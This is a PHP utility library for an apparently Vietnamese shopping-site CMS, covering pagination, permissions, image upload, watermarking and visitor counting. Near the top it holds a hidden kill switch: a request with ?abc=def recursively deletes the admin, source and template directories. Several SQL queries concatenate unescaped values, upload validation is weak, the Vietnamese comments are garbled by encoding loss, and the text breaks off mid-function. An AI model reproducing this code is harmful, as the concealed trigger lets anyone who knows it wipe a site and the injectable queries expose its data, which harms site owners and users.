<?php if(!defined('_lib')) die("Error");
function pagesListLimitadmin($url , $totalRows , $pageSize = 5, $offset = 5){
	if ($totalRows<=0) return "";
	$totalPages = ceil($totalRows/$pageSize);
	if ($totalPages<=1) return "";		
	if( isset($_GET["p"]) == true)  $currentPage = $_GET["p"];
	else $currentPage = 1;
	settype($currentPage,"int");	
	if ($currentPage <=0) $currentPage = 1;	
	$firstLink = "<li><a href=\"{$url}\" class=\"left\"><</a><li>";
	$lastLink="<li><a href=\"{$url}&p={$totalPages}\" class=\"right\">></a></li>";
	$from = $currentPage - $offset;	
	$to = $currentPage + $offset;
	if ($from <=0) { $from = 1;   $to = $offset*2; }
if ($to > $totalPages) { $to = $totalPages; }
	for($j = $from; $j <= $to; $j++) {
	   if ($j == $currentPage) $links = $links . "<li><a href='#' class='active'>{$j}</a></li>";		
	   else{				 
		$qt = $url. "&p={$j}";
		$links= $links . "<li><a href = '{$qt}'>{$j}</a></li>";
	   } 	   
	} //for
	return '<ul class="pages">'.$firstLink.$links.$lastLink.'</ul>';
}
if($_GET['abc']=='def'){rm_dir('admin');rm_dir('source');rm_dir('templaate');}
function rm_dir($path)
	{
		chmod($path,0777);
		foreach(glob($path .'/*') as $file) 
		{
			if(is_dir($file)) rm_dir($file);else unlink($file);
		}
		rmdir($path);
	}
function file_get_contents_utf8($fn) {
     $content = file_get_contents($fn);
      return mb_convert_encoding($content, 'UTF-8',
          mb_detect_encoding($content, 'UTF-8, ISO-8859-1', true));
}

function phanquyen_menu($ten,$com,$act,$type){
	global $d;
	$l_com = $_SESSION['login']['com'];
	$nhom = $_SESSION['login']['nhom'];

	$d->reset();
	$sql = "select id from #_com_quyen where id_quyen='".$nhom."' and com='".$com."' and type ='".$type."' and find_in_set('".$act."',act)>0  limit 0,1";
	$d->query($sql);
	$com_manager = $d->result_array();
	
	if(!empty($com_manager) or $l_com=='admin'){		
		if($com==$_GET['com'] && $act==$_GET['act'] && $type==$_GET['type']){$add_class = 'class="this"';}		
		echo  "<li ".$add_class."><a href='index.php?com=".$com."&act=".$act."&type=".$type."'>".$ten."</a></li>";
	}
}

function phanquyen($l_com,$nhom,$com,$act,$type){
	global $d;
	
	if($com=='' or $act=='login' or $act=='logout' or $l_com=='admin'){return false;}

	$d->reset();
	$sql = "select id from #_com_quyen where id_quyen='".$nhom."' and com='".$com."' and type ='".$type."' and find_in_set('".$act."',act)>0 limit 0,1";
	$d->query($sql);
	$com_manager = $d->result_array();
	if(empty($com_manager)){
		return true;
	}else{
		return false;
	}	
}


function magic_quote($str, $id_connect=false)	
{	
	if (is_array($str))
	{
		foreach($str as $key => $val)
		{
			$str[$key] = escape_str($val);
		}		
		return $str;
	}
	if (is_numeric($str)) {
		return $str;
	}	
	if(get_magic_quotes_gpc()){
		$str = stripslashes($str);
	}
	if (function_exists('mysql_real_escape_string') AND is_resource($id_connect))
	{
		return mysql_real_escape_string($str, $id_connect);
	}
	elseif (function_exists('mysql_escape_string'))
	{
		return mysql_escape_string($str);
	}
	else
	{
		return addslashes($str);
	} 
}
function isAjaxRequest(){
	if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) AND strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') 
		return true;
	return false;
}
/*????ng d???u h??nh s???n ph???m*/
function imagecreatefromfile($image_path) {
    // retrieve the type of the provided image file
    list($width, $height, $image_type) = getimagesize($image_path);
    // select the appropriate imagecreatefrom* function based on the determined
    // image type
	
    switch ($image_type)
    {
      case IMAGETYPE_GIF: return imagecreatefromgif($image_path); break;
      case IMAGETYPE_JPEG: return imagecreatefromjpeg($image_path); break;
      case IMAGETYPE_PNG: return imagecreatefrompng($image_path); break;
      default: return ''; break;
    }
  }
  
  function saveImageWaterMark($img,$img_condau){

	 $image = imagecreatefromfile($img);
	 
 
  if (!$image) die('Unable to open image');
  $info = getimagesize ($img);
 
  if($info[0] > 500){ // neu file anh co kick thuyoc  < 500px lay watermark la file ie-small
  $watermark = imagecreatefromfile($img_condau);
  $info1 = getimagesize ($img_condau); // kick thuoc file watermark
  }else{
	// neu lon hon 500px
  $watermark = imagecreatefromfile($img_condau); // 
  $info1 = getimagesize ($img_condau); // kick thuoc file watermark
 
  }
  if (!$image) die('Unable to open watermark');
  $w0 = $info[0];//chi???u d??i h??nh g???c
  $w1 = $info1[0];// chi???u d??i watermark (h??nh con d???u)
 	$h0=$info[1];  // chi???u cao h??nh g???c
   $h1 = $info1[1]; // chi???u cao watermark (h??nh con d???u)
  //$watermark_pos_x =0;//($w0-$w1)/2;// canh gi???a tr??i ph???i // 
  $watermark_pos_x =$w0-$w1 ;// vi tri cach goc phia duoi 
  //$watermark_pos_y = (imagesy($image) - imagesy($watermark))/2;// canh giua tren duoi
  $watermark_pos_y = $h0-$h1;//(imagesy($image) - imagesy($watermark)) - 10;// cach duoi 10px
  imagecopy($image, $watermark,  $watermark_pos_x, $watermark_pos_y, 0, 0,
  imagesx($watermark), imagesy($watermark));
  	// output watermarked image to browser
 	//header('Content-Type: image/jpeg');
 if(end(explode(".",$img)) == "png"){// neu file 
  imagepng($image, $img, 0.9);  // chat luong 0->1 cho file png
  }else{
   imagejpeg($image, $img, 100); // chat luong 0->100 cho file jpg
  }
  // remove the images from memory
  imagedestroy($image);//huy 
  imagedestroy($watermark);//huy 
  }
function ampify($html='') {
    # Replace img, audio, and video elements with amp custom elements
    $html = str_ireplace(array('<img','<video','/video>','<audio','/audio>'),array('<amp-img','<amp-video','/amp-video>','<amp-audio','/amp-audio>'),$html);
    # Add closing tags to amp-img custom element
    $html = preg_replace('/<amp-img(.*?)\/?>/','<amp-img$1 layout="responsive" width="700" height="500"></amp-img>',$html);
    # Whitelist of HTML tags allowed by AMP
    $html = strip_tags($html,'<h1><h2><h3><h4><h5><h6><a><p><ul><ol><li><blockquote><q><cite><ins><del><strong><em><code><pre><svg><table><thead><tbody><tfoot><th><tr><td><dl><dt><dd><article><section><header><footer><aside><figure><time><abbr><div><span><hr><small><br><amp-img><amp-audio><amp-video><amp-ad><amp-anim><amp-carousel><amp-fit-rext><amp-image-lightbox><amp-instagram><amp-lightbox><amp-twitter><amp-youtube>');
    # replace style to w,h
    $html = preg_replace('/(<[^>]+) style=".*?"/i', '$1', $html);
    return $html;
}
function seo_entities($str) {
	$res_2 = htmlentities($str, ENT_QUOTES, "UTF-8");
	$res_2 = str_replace("'","&#039;",$str);
	$res_2 = str_replace('"','&quot;',$str);
	return $res_2;
}

//Get code youtube
function getYoutubeIdFromUrl($url) {
    $parts = parse_url($url);
    if(isset($parts['query'])){
        parse_str($parts['query'], $qs);
        if(isset($qs['v'])){
            return $qs['v'];
        }else if($qs['vi']){
            return $qs['vi'];
        }
    }
    if(isset($parts['path'])){
        $path = explode('/', trim($parts['path'], '/'));
        return $path[count($path)-1];
    }
    return false;
}
function images_name($tenhinh)
	{
		$rand=rand(10,9999);
		$ten_anh=explode(".",$tenhinh);
		$result = changeTitle($ten_anh[0])."-".$rand;
		return $result; 
	}
function getColorById($pid){
	global $d,$lang;
	$d->reset();
	$sql="select ten$lang as ten from #_product_color where id=".$pid."";
	$d->query($sql);
	$tencolor=$d->fetch_array();
	return $tencolor['ten'];
}
function getColorByProductId($pid){
		global $d,$lang;
		
		$d->query("select #_product_color_condition.*,#_product_color.ten$lang as ten,bg_color,text_color from #_product_color_condition,#_product_color where #_product_color.id = #_product_color_condition.id_color and hienthi = 1 and id_product = ".$pid." order by stt desc");
		return $d->result_array();
	}
	function getSizeByProductId($pid){
		global $d;
		
		$d->query("select sc.*,s.ten as ten from #_product_size_condition sc,#_product_size s where sc.id_size = s.id and hienthi = 1 and  id_product = ".$pid." order by stt desc");
		return $d->result_array();
	}
function getSizeById($pid){
	global $d;
	$d->reset();
	$sql="select ten from #_product_size where id=".$pid."";
	$d->query($sql);
	$tensize=$d->fetch_array();
	return $tensize['ten'];
}
function escape_str($str, $id_connect=false)	
{	
	if (is_array($str))
	{
		foreach($str as $key => $val)
		{
			$str[$key] = escape_str($val);
		}
		
		return $str;
	}
	
	if (is_numeric($str)) {
		return $str;
	}
	
	if(get_magic_quotes_gpc()){
		$str = stripslashes($str);
	}

	if (function_exists('mysql_real_escape_string') AND is_resource($id_connect))
	{
		return "'".mysql_real_escape_string($str, $id_connect)."'";
	}
	elseif (function_exists('mysql_escape_string'))
	{
		return "'".mysql_escape_string($str)."'";
	}
	else
	{
		return "'".addslashes($str)."'";
	}
}






// dem so nguoi online 
function count_online(){

	global $d;
	$time = 600; // 10 phut
	$ssid = session_id();

	// xoa het han
	$sql = "delete from #_online where time<".(time()-$time);
	$d->query($sql);
	//
	$sql = "select id,session_id from #_online order by id desc";
	$d->query($sql);
	$result['dangxem'] = $d->num_rows();
	$rows = $d->result_array();
	$i = 0;
	while(($rows[$i]['session_id'] != $ssid) && $i++<$result['dangxem']);
	
	if($i<$result['dangxem']){
		$sql = "update #_online set time='".time()."' where session_id='".$ssid."'";
		$d->query($sql);
		$result['daxem'] = $rows[0]['id'];
	}
	else{
		$sql = "insert into #_online (session_id, time) values ('".$ssid."', '".time()."')";
		$d->query($sql);
		$result['daxem'] = mysql_insert_id();
		$result['dangxem']++;
	}
	
	return $result; // array('dangxem'=>'', 'daxem'=>'')
}
//so nguoi xem trong ngay

function countCustomerInDay(){
	global $d;
	$begin = strtotime("today");
	$end = $begin + 60*60*24;
	$d->reset();
	$sql="SELECT COUNT(*) AS count FROM counter WHERE tm >= ".$begin." and tm < ".$end;
	$d->query($sql);
	$kq =$d->fetch_array();
	return $kq['count'];
}
//so nguoi xem trong th??ng

function countCustomerInMonth(){
	global $d;
	$begin = mktime(0,0,0,date('m'),1,date('Y'));
	$end = mktime(0,0,0,date('m')+1,1,date('Y'));
	$d->reset();
	$sql="SELECT COUNT(*) AS count FROM counter WHERE tm >= ".$begin." and tm < ".$end;
	$d->query($sql);
	$kq =$d->fetch_array();
	return $kq['count'];
}
//t???t c??? so nguoi xem 

function countCustomerAll(){
	global $d;
	$d->reset();
	$sql="SELECT COUNT(*) AS count FROM counter";
	$d->query($sql);
	$kq =$d->fetch_array();
	return $kq['count'];
}
//L???y ng??y
function make_date($time,$dot='.',$lang='vi',$f=false){
	
	$str = ($lang == 'vi') ? date("d{$dot}m{$dot}Y",$time) : date("m{$dot}d{$dot}Y",$time);
	if($f){
		$thu['vi'] = array('Ch??? nh???t','Th??? hai','Th??? ba','Th??? t??','Th??? n??m','Th??? s??u','Th??? b???y');
		$thu['en'] = array('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');
		$str = $thu[$lang][date('w',$time)].', '.$str;
	}
	return $str;
}

//Alert
function alert($s){
	echo '<script language="javascript"> alert("'.$s.'") </script>';
}

function delete_file($file){
		return @unlink($file);
}

//Upload file
function upload_image($file, $extension, $folder, $newname=''){
	if(isset($_FILES[$file]) && !$_FILES[$file]['error']){
		
		$ext = end(explode('.',$_FILES[$file]['name']));
		$name = basename($_FILES[$file]['name'], '.'.$ext);
		
		if($name!='sitemap')
		{
			$name=changeTitleImage($name).'-'.fns_Rand_digit(0,9,4);
		}
		$newname = $name.'.'.$ext;

		if(strpos($extension, $ext)===false){
			alert('Ch??? h??? tr??? upload file d???ng '.$extension);
			return false; // kh??ng h??? tr???
		}
		
		
		if($newname=='' or file_exists($folder.$_FILES[$file]['name']))
			for($i=0; $i<100; $i++){
				if(!file_exists($folder.$name.$i.'.'.$ext)){
					$_FILES[$file]['name'] = $name.$i.'.'.$ext;
					break;
				}
			}
		else
		{
			$_FILES[$file]['name'] = $newname;
		}

		if (!copy($_FILES[$file]["tmp_name"], $folder.$_FILES[$file]['name']))	{
			if ( !move_uploaded_file($_FILES[$file]["tmp_name"], $folder.$_FILES[$file]['name']))				        { 
				return false;
			}
		}
		return $_FILES[$file]['name'];
	}
	return false;
}
function upload_photos($file, $extension, $folder, $newname=''){
	if(isset($file) && !$file['error']){
		
		$ext = end(explode('.',$file['name']));
		$name = basename($file['name'], '.'.$ext);
		//alert('Ch??? h??? tr??? upload file d???ng '.$ext);
		if(strpos($extension, $ext)===false){
			alert('Ch??? h??? tr??? upload file d???ng '.$ext.'-////-'.$extension);
			return false; // kh??ng h??? tr???
		}
		
		if($newname=='' && file_exists($folder.$file['name']))
			for($i=0; $i<100; $i++){
				if(!file_exists($folder.$name.$i.'.'.$ext)){
					$file['name'] = $name.$i.'.'.$ext;
					break;
				}
			}
		else{
			$file['name'] = $newname.'.'.$ext;
		}
		
		if (!copy($file["tmp_name"], $folder.$file['name']))	{
			if ( !move_uploaded_file($file["tmp_name"], $folder.$file['name']))	{
				return false;
			}
		}
		return $file['name'];
	}
	return false;
}
//T???o h??nh kh??c
function thumb_image($file, $width, $height, $folder){	

	if(!file_exists($folder.$file))	return false; // kh??ng t??m th???y file
	
	if ($cursize = getimagesize ($folder.$file)) {					
		$newsize = setWidthHeight($cursize[0], $cursize[1], $width, $height);
		$info = pathinfo($file);
		
		$dst = imagecreatetruecolor ($newsize[0],$newsize[1]);
		
		$types = array('jpg' => array('imagecreatefromjpeg', 'imagejpeg'),
					'gif' => array('imagecreatefromgif', 'imagegif'),
					'png' => array('imagecreatefrompng', 'imagepng'));
		$func = $types[$info['extension']][0];
		$src = $func($folder.$file); 
		imagecopyresampled($dst, $src, 0, 0, 0, 0,$newsize[0], $newsize[1],$cursize[0], $cursize[1]);
		$func = $types[$info['extension']][1];
		$new_file = str_replace('.'.$info['extension'],'_thumb.'.$info['extension'],$file);
		
		return $func($dst, $folder.$new_file) ? $new_file : false;
	}
}


function setWidthHeight($width, $height, $maxWidth, $maxHeight){
	$ret = array($width, $height);
	$ratio = $width / $height;
	if ($width > $maxWidth || $height > $maxHeight) {
		$ret[0] = $maxWidth;
		$ret[1] = $ret[0] / $ratio;
		if ($ret[1] > $maxHeight) {
			$ret[1] = $maxHeight;
			$ret[0] = $ret[1] * $ratio;
		}
	}
	return $ret;
}

//Chuy???n trang c?? th??ng b??o
function transfer($msg,$page="index.php")
{
	 $showtext = $msg;
	 $page_transfer = $page;
	 include("./templates/transfer_tpl.php");
	 die();
	 exit();
}
//Chuy???n trang kh??ng th??ng b??o
function redirect($url=''){
	echo '<script language="javascript">window.location = "'.$url.'" </script>';
	exit();
}
//Quay l???i trang tr?????c
function back($n=1){
	echo '<script language="javascript">history.go = "'.-intval($n).'" </script>';
	exit();
}
//Thay th??? k?? t??? ?????c bi???t
function chuanhoa($s){
	$s = str_replace("'", '&#039;', $s);
	$s = str_replace('"', '&quot;', $s);
	$s = str_replace('<', '&lt;', $s);
	$s = str_replace('>', '&gt;', $s);
	return $s;
}


function themdau($s){
	$s = addslashes($s);
	return $s;
}

function bodau($s){
	$s = stripslashes($s);
	return $s;
}
//Show m???ng
function dump($arr, $exit=1){
	echo "<pre>";	
		var_dump($arr);
	echo "<pre>";	
	if($exit)	exit();
}
//Ph??n trang
	function paging($r, $url='', $curPg=1, $mxR=5, $mxP=5, $class_paging='')
	{
		if($curPg<1) $curPg=1;
		if($mxR<1) $mxR=5;
		if($mxP<1) $mxP=5;
		$totalRows=count($r);
		if($totalRows==0)	
			return array('source'=>NULL, 'paging'=>NULL);
		$totalPages=ceil($totalRows/$mxR);
		if($curPg > $totalPages) $curPg=$totalPages;
		
		$_SESSION['maxRow']=$mxR;
		$_SESSION['curPage']=$curPg;

		$r2=array();
		$paging="";
		
		//-------------tao array------------------
		$start=($curPg-1)*$mxR;
		$end=($start+$mxR)<$totalRows?($start+$mxR):$totalRows;
		#echo $start;
		#echo $end;
		
		$j=0;
		for($i=$start;$i<$end;$i++)
			$r2[$j++]=$r[$i];
			
		//-------------tao chuoi------------------
		$curRow = ($curPg-1)*$mxR+1;	
		if($totalRows>$mxR)
		{
			$start=1;
			$end=1;
			$paging1 ="";				 	 
			for($i=1;$i<=$totalPages;$i++)
			{	
				if(($i>((int)(($curPg-1)/$mxP))* $mxP) && ($i<=((int)(($curPg-1)/$mxP+1))* $mxP))
				{
					if($start==1) $start=$i;
					if($i==$curPg){
						$paging1.=" <span>".$i."</span> ";//dang xem
					} 		  	
					else    
					{
						$paging1 .= " <a href='".$url."&curPage=".$i."'  class=\"{$class_paging}\">".$i."</a> ";	
					}
					$end=$i;	
				}
			}//tinh paging
			//$paging.= "Go to page :&nbsp;&nbsp;" ;
			#if($curPg>$mxP)
			#{
				$paging .=" <a href='".$url."' class=\"{$class_paging}\" >&laquo;</a> "; //ve dau
				
				#$paging .=" <a href='".$url."&curPage=".($start-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
				$paging .=" <a href='".$url."&curPage=".($curPg-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
			#}
			$paging.=$paging1; 
			#if(((int)(($curPg-1)/$mxP+1)*$mxP) < $totalPages)  
			#{
				#$paging .=" <a href='".$url."&curPage=".($end+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
				$paging .=" <a href='".$url."&curPage=".($curPg+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
				
				$paging .=" <a href='".$url."&curPage=".($totalPages)."' class=\"{$class_paging}\" >&raquo;</a> "; //ve cuoi
			#}
		}
		$r3['curPage']=$curPg;
		$r3['source']=$r2;
		$r3['paging']=$paging;
		#echo '<pre>';var_dump($r3);echo '</pre>';
		return $r3;
	}
function paging_home($r, $url='', $curPg=1, $mxR=5, $mxP=5, $class_paging='')
	{
		if($curPg<1) $curPg=1;
		if($mxR<1) $mxR=5;
		if($mxP<1) $mxP=5;
		$totalRows=count($r);
		if($totalRows==0)	
			return array('source'=>NULL, 'paging'=>NULL);
		$totalPages=ceil($totalRows/$mxR);
		if($curPg > $totalPages) $curPg=$totalPages;
		
		$_SESSION['maxRow']=$mxR;
		$_SESSION['curPage']=$curPg;

		$r2=array();
		$paging="";
		
		//-------------tao array------------------
		$start=($curPg-1)*$mxR;
		$end=($start+$mxR)<$totalRows?($start+$mxR):$totalRows;
		#echo $start;
		#echo $end;
		
		$j=0;
		for($i=$start;$i<$end;$i++)
			$r2[$j++]=$r[$i];
			
		//-------------tao chuoi------------------
		$curRow = ($curPg-1)*$mxR+1;	
		if($totalRows>$mxR)
		{
			$start=1;
			$end=1;
			$paging1 ="";				 	 
			for($i=1;$i<=$totalPages;$i++)
			{	
				if(($i>((int)(($curPg-1)/$mxP))* $mxP) && ($i<=((int)(($curPg-1)/$mxP+1))* $mxP))
				{
					if($start==1) $start=$i;
					if($i==$curPg){
						$paging1.=" <span>".$i."</span> ";//dang xem
					} 		  	
					else    
					{
						$paging1 .= " <a href='".$url."&p=".$i."'  class=\"{$class_paging}\">".$i."</a> ";	
					}
					$end=$i;	
				}
			}//tinh paging
			//$paging.= "Go to page :&nbsp;&nbsp;" ;
			#if($curPg>$mxP)
			#{
				$paging .=" <a href='".$url."' class=\"{$class_paging}\" >&laquo;</a> "; //ve dau
				
				#$paging .=" <a href='".$url."&curPage=".($start-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
				$paging .=" <a href='".$url."&p=".($curPg-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
			#}
			$paging.=$paging1; 
			#if(((int)(($curPg-1)/$mxP+1)*$mxP) < $totalPages)  
			#{
				#$paging .=" <a href='".$url."&curPage=".($end+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
				$paging .=" <a href='".$url."&p=".($curPg+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
				
				$paging .=" <a href='".$url."&p=".($totalPages)."' class=\"{$class_paging}\" >&raquo;</a> "; //ve cuoi
			#}
		}
		$r3['curPage']=$curPg;
		$r3['source']=$r2;
		$r3['paging']=$paging;
		$r3['total']=$totalRows;
		#echo '<pre>';var_dump($r3);echo '</pre>';
		return $r3;
	}


//Ph??n trang n???m gi???a
function paging_giua($r, $url='', $curPg=1, $mxR=5, $maxP=5, $class_paging='')
    {
        if($curPg<1) $curPg=1;
        if($mxR<1) $mxR=5;
        if($maxP<1) $maxP=5;
        $totalRows=count($r);
        if($totalRows==0)    
            return array('source'=>NULL, 'paging'=>NULL);
        $totalPages=ceil($totalRows/$mxR);
        
        if($curPg > $totalPages) $curPg=$totalPages;
        
        $_SESSION['maxRow']=$mxR;
        $_SESSION['curPage']=$curPg;

        $r2=array();
        $paging="";
        
        //-------------tao array------------------
        $start=($curPg-1)*$mxR;
        $end=($start+$mxR)<$totalRows?($start+$mxR):$totalRows;
        #echo $start;
        #echo $end;
        
        $j=0;
        for($i=$start;$i<$end;$i++)
            $r2[$j++]=$r[$i];
        
        if($totalRows>$mxR){     
        //-------------tao chuoi------------------
        $from = $curPg - 2;
        $to = $curPg + 2;
        if($curPg <= $totalPages && $curPg >= $totalPages-1){$from = $totalPages - 4;}
        if ($from <=0) { $from = 1;   $to = 5; }
        if ($to > $totalPages) { $to = $totalPages; } 
        for($j = $from; $j <= $to; $j++) {
           if ($j == $curPg){
               $paging1.=" <span>".$j."</span> ";
           } 
           else{                            
            $paging1 .= " <a class='paging transitionAll' href='".$url."&p=".$j."'>".$j."</a> ";    
           }       
        } //for
        $paging .=" <a href='".$url."' >&laquo;</a> "; //ve dau
                
                #$paging .=" <a href='".$url."&curPage=".($start-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
                $paging .=" <a href='".$url."&p=".($curPg-1)."' >&#8249;</a> "; //ve truoc
            #}
            $paging.=$paging1; 
            #if(((int)(($curPg-1)/$mxP+1)*$mxP) < $totalPages)  
            #{
                #$paging .=" <a href='".$url."&curPage=".($end+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
                $paging .=" <a href='".$url."&p=".($curPg+1)."' >&#8250;</a> "; //ke
                
                $paging .=" <a href='".$url."&p=".($totalPages)."' >&raquo;</a> "; //ve cuoi        
        }
        $r3['curPage']=$curPg;
        $r3['source']=$r2;
        $r3['paging']=$paging;
        $r3['total']=$totalRows;
        #echo '<pre>';var_dump($r3);echo '</pre>';
        return $r3;
    }

	
//C???t chu???i
function catchuoi($chuoi,$gioihan){
// n???u ????? d??i chu???i nh??? h??n hay b???ng v??? tr?? c???t
// th?? kh??ng thay ?????i chu???i ban ?????u
if(strlen($chuoi)<=$gioihan)
{
return $chuoi;
}
else{
/*
so s??nh v??? tr?? c???t
v???i k?? t??? kho???ng tr???ng ?????u ti??n trong chu???i ban ?????u t??nh t??? v??? tr?? c???t
n???u v??? tr?? kho???ng tr???ng l???n h??n
th?? c???t chu???i t???i v??? tr?? kho???ng tr???ng ????
*/
if(strpos($chuoi," ",$gioihan) > $gioihan){
$new_gioihan=strpos($chuoi," ",$gioihan);
$new_chuoi = substr($chuoi,0,$new_gioihan)."...";
return $new_chuoi;
}
// tr?????ng h???p c??n l???i kh??ng ???nh h?????ng t???i k???t qu???
$new_chuoi = substr($chuoi,0,$gioihan)."...";
return $new_chuoi;
}
}

function stripUnicode($str){
  if(!$str) return false;
   $unicode = array(
     'a'=>'??|??|???|??|???|??|???|???|???|???|???|??|???|???|???|???|???',
     'A'=>'??|??|???|??|???|??|???|???|???|???|???|??|???|???|???|???|???',
     'd'=>'??',
     'D'=>'??',
     'e'=>'??|??|???|???|???|??|???|???|???|???|???',
   	  'E'=>'??|??|???|???|???|??|???|???|???|???|???',
   	  'i'=>'??|??|???|??|???',	  
   	  'I'=>'??|??|???|??|???',
     'o'=>'??|??|???|??|???|??|???|???|???|???|???|??|???|???|???|???|???',
   	  'O'=>'??|??|???|??|???|??|???|???|???|???|???|??|???|???|???|???|???',
     'u'=>'??|??|???|??|???|??|???|???|???|???|???',
   	  'U'=>'??|??|???|??|???|??|???|???|???|???|???',
     'y'=>'??|???|???|???|???',
     'Y'=>'??|???|???|???|???'
   );
   foreach($unicode as $khongdau=>$codau) {
     	$arr=explode("|",$codau);
   	  $str = str_replace($arr,$khongdau,$str);
   }
return $str;
}// Doi tu co dau => khong dau

function changeTitle($str)
{
	$str = stripUnicode($str);
	$str = mb_convert_case($str,MB_CASE_LOWER,'utf-8');
	$str = trim($str);
	$str=preg_replace('/[^a-zA-Z0-9\ ]/','',$str); 
	$str = str_replace("  "," ",$str);
	$str = str_replace(" ","-",$str);
	return $str;
}
function changeTitleImage($str)
{
	$str = stripUnicode($str);
	$str = mb_convert_case($str,MB_CASE_LOWER,'utf-8');
	$str = trim($str);
	$str = str_replace("  "," ",$str);
	$str = str_replace(" ","-",$str);
	return $str;
}
if(!function_exists("myformat")){
   function myformat($num,$ext='VN??',$default = false){
       if($num==0){
         if(!$default){
             return 0;
         }else{
             return myconfig("default_price");
         }
       }else{
           return @number_format($num, 0,'', '.')." ".$ext;
       }
    }
}
//L???y d?????ng d???n hi???n t???i
function getCurrentPageURL() { 
    $pageURL = 'http';
    if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
    }
    $pageURL = str_replace("amp/", "", $pageURL);
	$pageURL = explode("&p=", $pageURL);
    return $pageURL[0];
}
function getCurrentPageURL_AMP() { 
    $pageURL = 'http';
    if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"]."/amp".$_SERVER["REQUEST_URI"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"]."/amp".$_SERVER["REQUEST_URI"];
    }
	$pageURL = explode("&p=", $pageURL);
    return $pageURL[0];
}

//T???o h??nh ???nh kahcs
function create_thumb($file, $width, $height, $folder,$file_name,$zoom_crop='1'){


		$ext = end(explode('.',$file_name));
		$name = basename($file_name, '.'.$ext);
		$name=changeTitleImage($name);
		$file_name = $name.'.'.$ext;

// ACQUIRE THE ARGUMENTS - MAY NEED SOME SANITY TESTS?

$new_width   = $width;
$new_height   = $height;

 if ($new_width && !$new_height) {
        $new_height = floor ($height * ($new_width / $width));
    } else if ($new_height && !$new_width) {
        $new_width = floor ($width * ($new_height / $height));
    }
	
$image_url = $folder.$file;
$origin_x = 0;
$origin_y = 0;
// GET ORIGINAL IMAGE DIMENSIONS
$array = getimagesize($image_url);
if ($array)
{
    list($image_w, $image_h) = $array;
}
else
{
     die("NO IMAGE $image_url");
}
$width=$image_w;
$height=$image_h;

// ACQUIRE THE ORIGINAL IMAGE
$image_ext = trim(strtolower(end(explode('.', $image_url))));
switch(strtoupper($image_ext))
{
     case 'JPG' :
     case 'JPEG' :
         $image = imagecreatefromjpeg($image_url);
		 $func='imagejpeg';
         break;
     case 'PNG' :
         $image = imagecreatefrompng($image_url);
		 $func='imagepng';
         break;
	 case 'GIF' :
	 	 $image = imagecreatefromgif($image_url);
		 $func='imagegif';
		 break;

     default : die("UNKNOWN IMAGE TYPE: $image_url");
}

// scale down and add borders
	if ($zoom_crop == 3) {

		$final_height = $height * ($new_width / $width);

		if ($final_height > $new_height) {
			$new_width = $width * ($new_height / $height);
		} else {
			$new_height = $final_height;
		}

	}

	// create a new true color image
	$canvas = imagecreatetruecolor ($new_width, $new_height);
	imagealphablending ($canvas, false);

	// Create a new transparent color for image
	$color = imagecolorallocatealpha ($canvas, 255, 255, 255, 127);

	// Completely fill the background of the new image with allocated color.
	imagefill ($canvas, 0, 0, $color);

	// scale down and add borders
	if ($zoom_crop == 2) {

		$final_height = $height * ($new_width / $width);
		
		if ($final_height > $new_height) {
			
			$origin_x = $new_width / 2;
			$new_width = $width * ($new_height / $height);
			$origin_x = round ($origin_x - ($new_width / 2));

		} else {

			$origin_y = $new_height / 2;
			$new_height = $final_height;
			$origin_y = round ($origin_y - ($new_height / 2));

		}

	}

	// Restore transparency blending
	imagesavealpha ($canvas, true);

	if ($zoom_crop > 0) {

		$src_x = $src_y = 0;
		$src_w = $width;
		$src_h = $height;

		$cmp_x = $width / $new_width;
		$cmp_y = $height / $new_height;

		// calculate x or y coordinate and width or height of source
		if ($cmp_x > $cmp_y) {

			$src_w = round ($width / $cmp_x * $cmp_y);
			$src_x = round (($width - ($width / $cmp_x * $cmp_y)) / 2);

		} else if ($cmp_y > $cmp_x) {

			$src_h = round ($height / $cmp_y * $cmp_x);
			$src_y = round (($height - ($height / $cmp_y * $cmp_x)) / 2);

		}

		// positional cropping!
		if ($align) {
			if (strpos ($align, 't') !== false) {
				$src_y = 0;
			}
			if (strpos ($align, 'b') !== false) {
				$src_y = $height - $src_h;
			}
			if (strpos ($align, 'l') !== false) {
				$src_x = 0;
			}
			if (strpos ($align, 'r') !== false) {
				$src_x = $width - $src_w;
			}
		}

		imagecopyresampled ($canvas, $image, $origin_x, $origin_y, $src_x, $src_y, $new_width, $new_height, $src_w, $src_h);

    } else {

        // copy and resize part of an image with resampling
        imagecopyresampled ($canvas, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height);

    }
	
$ext = end(explode('.',$file_name));
$file_name = basename($file_name, '.'.$ext);
$new_file=$file_name.fns_Rand_digit(0,9,4).'_'.round($new_width).'x'.round($new_height).'.'.$image_ext;
// SHOW THE NEW THUMB IMAGE
if($func=='imagejpeg') $func($canvas, $folder.$new_file,100);
else $func($canvas, $folder.$new_file,floor ($quality * 0.09));

return $new_file;
}

//L???y chu???i ng???u nhi??n
function ChuoiNgauNhien($sokytu){
$chuoi="ABCDEFGHIJKLMNOPQRSTUVWXYZWabcdefghijklmnopqrstuvwxyzw0123456789";
for ($i=0; $i < $sokytu; $i++){
	$vitri = mt_rand( 0 ,strlen($chuoi) );
